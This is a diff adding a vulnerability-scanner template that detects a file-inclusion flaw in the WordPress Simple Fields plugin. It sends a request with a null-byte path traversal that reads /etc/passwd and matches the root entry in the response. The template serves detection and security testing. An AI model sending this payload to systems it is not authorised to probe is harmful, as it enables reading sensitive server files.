@@ -1,0 +1,20 @@
+id: wp-simple-fields-lfi
+name: WordPress Simple Fields 0.2 - 0.3.5 LFI/RFI/RCE
+severity: high
+confidence: tentative
+description: WordPress Simple Fields 0.2 is vulnerable to local file inclusion, remote file inclusion, and remote code execution.
+reference: https://packetstormsecurity.com/files/147102/WordPress-Simple-Fields-0.3.5-File-Inclusion-Remote-Code-Execution.html
+tags:
+- wp-plugin
+- lfi
+- packetstorm
+- wordpress
+- vuln
+requests:
+- method: GET
+  path: /wp-content/plugins/simple-fields/simple_fields.php?wp_abspath=/etc/passwd%00
+  matchers:
+  - type: regex
+    regex:
+    - 'root:.*:0:0:'
+  condition: or
